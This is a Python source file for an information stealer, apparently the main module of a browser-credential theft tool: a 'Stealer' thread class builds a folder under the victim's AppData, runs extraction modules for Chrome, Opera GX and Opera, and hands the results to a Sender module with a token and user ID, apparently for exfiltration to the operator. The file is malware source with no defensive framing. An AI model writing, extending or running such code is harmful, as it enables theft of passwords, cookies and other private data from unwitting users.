from shutil import rmtree
from os import path, mkdir
from threading import Thread

from modules.sender import Sender
from browsers.chrome import Chrome
from browsers.opera_gx import Opera_GX
from browsers.opera_default import Opera_Default

from getpass import getuser


class Stealer(Thread):

    def __init__(self, token: str, user_id: int):
        Thread.__init__(self, name="Stealer")

        self.token = token
        self.user_id = user_id

        self.user = getuser()
        self.storage_path = f"C:/Users/{self.user}/AppData/files/"

        self.browsers = [
            {
                "method": Chrome(
                    self.storage_path
                )
            },
            {
                "method": Opera_GX(
                    self.storage_path
                )
            },
            {
                "method": Opera_Default(
                    self.storage_path
                )
            }
        ]

    def __create_storage(self):

        if not path.exists(self.storage_path):

            mkdir(self.storage_path)
            mkdir(self.storage_path + "results")

        else:

            rmtree(self.storage_path + "results")
            mkdir(self.storage_path + "results")

    def run(self):

        self.__create_storage()

        for browser in self.browsers:
            browser["method"].run()

        sender = Sender(self.user,  self.storage_path, self.token, self.user_id)
        sender.run()
